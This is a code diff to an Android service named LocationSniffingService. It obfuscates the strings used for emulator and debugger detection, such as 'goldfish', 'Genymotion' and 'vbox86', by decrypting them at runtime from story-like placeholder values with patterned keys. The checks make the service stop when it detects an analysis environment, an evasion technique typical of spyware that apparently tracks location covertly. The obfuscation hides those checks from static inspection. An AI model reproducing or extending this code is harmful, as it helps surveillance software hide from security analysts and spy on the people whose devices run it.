@@ -187,37 +187,82 @@ public class LocationSniffingService extends Service{
             return false;
         }
 
-        String a1 = "";
-        String a2 = "";
-        String a3 = "";
-        String a4 = "";
-        String a5 = "";
-        String a6 = "";
-        String a7 = "";
+        String a1 = "OnceUponATime";
+        String a2 = "LivedABunnyCalled";
+        String a3 = "Judy.SheWasGoingTo";
+        String a4 = "beTheBestCopIn";
+        String a5 = "Zo0o0o0o0Topia";
+        String a6 = "SheDidNotRealise";
+        String a7 = "however,ThatShe";
+        String a8 = "wasJustGoingtobe";
+        String a9 = "amereparkingWarden";
+        String a10 = "sadfacebunny";
+        String a11 = "theend";
+
+        String ak1 = "a1a1a1a1a1a1a1a1";
+        String ak2 = "b2b2b2b2b2b2b2b2";
+        String ak3 = "c3c3c3c3c3c3c3c3";
+        String ak4 = "d4d4d4d4d4d4d4d4";
+        String ak5 = "55eeeeee55ee55ee";
+        String ak6 = "f6f6f6f6f6f6f6f6";
+        String ak7 = "g7g7g7g7g7g7g7g7";
+        String ak8 = "h8h8h8h8h8h8h8h8";
+        String ak9 = "i9i9i9i9i9i9i9i9";
+        String ak10 = "00l0al01la0l0100";
+        String ak11 = "p11p11p11p11p111";
+
+        String generic = "";
+        String unknown = "";
+        String googlesdk = "";
+        String emulator = "";
+        String androidsdk86 = "";
+        String genymotion = "";
+        String sdk = "";
+        String sdk86 = "";
+        String vbox = "";
+        String goldfish = "";
+        String android = "";
+
+        try{
+            generic = StringHelper.getStringStatic(a1, ak1);
+            unknown = StringHelper.getStringStatic(a2, ak2);
+            googlesdk = StringHelper.getStringStatic(a3, ak3);
+            emulator = StringHelper.getStringStatic(a4, ak4);
+            androidsdk86 = StringHelper.getStringStatic(a5, ak5);
+            genymotion = StringHelper.getStringStatic(a6, ak6);
+            sdk = StringHelper.getStringStatic(a7, ak7);
+            sdk86 = StringHelper.getStringStatic(a8, ak8);
+            vbox = StringHelper.getStringStatic(a9, ak9);
+            goldfish = StringHelper.getStringStatic(a10, ak10);
+            android = StringHelper.getStringStatic(a11, ak11);
+        } catch (IllegalBlockSizeException e) {
+            e.printStackTrace();
+        } catch (BadPaddingException e) {
+            e.printStackTrace();
+        } catch (InvalidKeyException e) {
+            e.printStackTrace();
+        }
 
         //Check build's fingerprint
-        Boolean checkFingerprint =  fingerprint.startsWith("generic") ||
-                fingerprint.startsWith("unknown");
+        Boolean checkFingerprint =  fingerprint.startsWith(generic) ||
+                fingerprint.startsWith(unknown);
 
         //Check build's model
-        Boolean checkModel =        model.contains("google_sdk") ||
-                model.contains("Emulator") ||
-                model.contains("Android SDK built for x86");
+        Boolean checkModel =        model.contains(googlesdk) ||
+                model.contains(emulator) ||
+                model.contains(androidsdk86);
 
         //Check Manurfacturer for Genymotion (an emulation software)
-        Boolean checkManufacturer = manufacturer.contains("Genymotion") ||
-                manufacturer.contains("unknown");
+        Boolean checkManufacturer = manufacturer.contains(genymotion) ||
+                manufacturer.contains(unknown);
 
         //Check build's product
-        Boolean checkProduct = product.contains("google_sdk") ||
-                product.contains("sdk") ||
-                product.contains("sdk_x86") ||
-                product.contains("vbox86p") ||
-                product.contains("google_sdk");
+        Boolean checkProduct = product.contains(sdk) ||
+                product.contains(vbox);
 
         //Check for goldfish hardware
-        Boolean checkHardware = hardware.contains("goldfish") ||
-                hardware.contains("vbox86");
+        Boolean checkHardware = hardware.contains(goldfish) ||
+                hardware.contains(vbox);
 
         //Return if any is detected
         if(checkFingerprint || checkModel || checkManufacturer || checkProduct || checkHardware)
@@ -225,7 +270,7 @@ public class LocationSniffingService extends Service{
 
         //Check for telephone operator
         //Return if it is android
-        if("Android".equals(telephoneoperator))
+        if(android.equals(telephoneoperator))
             return false;
 
         //Return if debugger is connected
